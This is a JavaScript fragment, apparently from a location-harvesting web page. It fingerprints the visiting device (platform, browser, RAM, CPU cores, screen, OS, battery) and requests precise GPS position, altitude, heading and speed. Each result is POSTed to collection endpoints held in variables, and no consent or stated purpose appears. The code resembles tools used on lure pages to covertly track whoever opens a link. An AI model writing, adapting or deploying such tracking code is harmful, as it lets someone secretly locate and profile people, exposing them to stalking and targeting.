// -----------------------------------------------------
// 1. DEVICE INFO
// -----------------------------------------------------
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var brw = 'Unknown'; 
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';

  var ht = window.screen.height;
  var wd = window.screen.width;
  var os = ver; 
  if(os.includes(';')) {
      os = os.substring(0, os.indexOf(')'));
      os = os.split(';')[1];
      if (os) os = os.trim();
  }

  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// -----------------------------------------------------
// 3. LOCATION LOGIC
// -----------------------------------------------------
function locate(successCallback, failCallback) {
  if (navigator.geolocation) {
    // FIX: maximumAge is now correctly capitalized. 
    // FIX: Timeout increased to 10000ms to give the GPS hardware time to wake up.
    var optn = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
    
    navigator.geolocation.getCurrentPosition(
      function(position) { 
          showPosition(position, successCallback); 
      }, 
      function(error) { 
          $.ajax({
            type: 'POST',
            url: error_file,
            data: { Status: 'failed', Error: error.message },
            success: function() {
                if(successCallback) successCallback(); 
            }
          });
      }, 
      optn
    );
  } else {
    if(successCallback) successCallback();
  }
}

function showPosition(position, callback) {
  // STRICT PARSING: Ensures null values are cleanly handled
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  var acc = position.coords.accuracy !== null ? position.coords.accuracy : 0;
  var alt = position.coords.altitude !== null ? position.coords.altitude : 0;
  var dir = position.coords.heading !== null ? position.coords.heading : 0;
  var spd = position.coords.speed !== null ? position.coords.speed : 0;
  
  $.ajax({
    type: 'POST',
    url: result_file,
    data: { 
        Status: 'success', 
        Lat: lat, 
        Lon: lon, 
        Acc: acc, 
        Alt: alt, 
        Dir: dir, 
        Spd: spd 
    },
    success: function() { 
        if(callback) callback(); 
    },
    error: function() {
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}
